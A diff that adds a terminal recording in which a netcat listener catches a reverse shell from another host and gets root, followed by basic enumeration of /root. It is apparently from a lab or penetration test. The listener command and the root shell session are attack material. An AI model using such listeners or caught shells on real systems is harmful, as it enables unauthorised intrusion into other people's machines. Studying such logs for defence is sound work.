@@ -1,0 +1,36 @@
+Script started on 2025-02-06 14:10:25+03:00 [COMMAND="nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="104" LINES="27"]
+listening on [any] 6047 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 6336
+sh: cannot set terminal process group (1828): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4# whoami
+whoami
+root
+sh-4.4# cd /root
+cd /root
+sh-4.4# ls
+ls
+anaconda-ks.cfg
+sh-4.4# pwd
+pwd
+/root
+sh-4.4# ls -al
+ls -al
+total 24
+dr-xr-x---.  3 root root  192 Jan  8  2021 .
+dr-xr-xr-x. 17 root root  224 Nov  7  2020 ..
+lrwxrwxrwx.  1 root root    9 Nov  7  2020 .bash_history -> /dev/null
+-rw-r--r--.  1 root root   18 May 11  2019 .bash_logout
+-rw-r--r--.  1 root root  176 May 11  2019 .bash_profile
+-rw-r--r--.  1 root root  176 May 11  2019 .bashrc
+-rw-r--r--.  1 root root  100 May 11  2019 .cshrc
+lrwxrwxrwx.  1 root root    9 Nov  7  2020 .mysql_history -> /dev/null
+-rw-------.  1 root root    0 Jan  8  2021 .python_history
+drwx------.  2 root root   80 Jan  6  2021 .ssh
+-rw-r--r--.  1 root root  129 May 11  2019 .tcshrc
+-rw-------.  1 root root 1351 Nov  7  2020 anaconda-ks.cfg
+sh-4.4# exit
+exit
+exit
+
+Script done on 2025-02-06 14:54:56+03:00 [COMMAND_EXIT_CODE="0"]
